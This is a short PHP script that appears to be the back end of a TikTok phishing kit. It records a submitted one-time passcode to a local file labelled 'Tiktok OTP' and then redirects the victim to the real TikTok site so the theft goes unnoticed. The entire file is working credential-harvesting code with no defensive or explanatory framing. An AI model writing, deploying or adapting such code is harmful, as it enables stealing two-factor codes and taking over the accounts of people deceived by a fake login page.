<?php
file_put_contents("otp.txt", "Tiktok OTP : " .  $pass = $_POST['otp'] . "\n", FILE_APPEND);
header('Location: https://www.tiktok.com');
?>
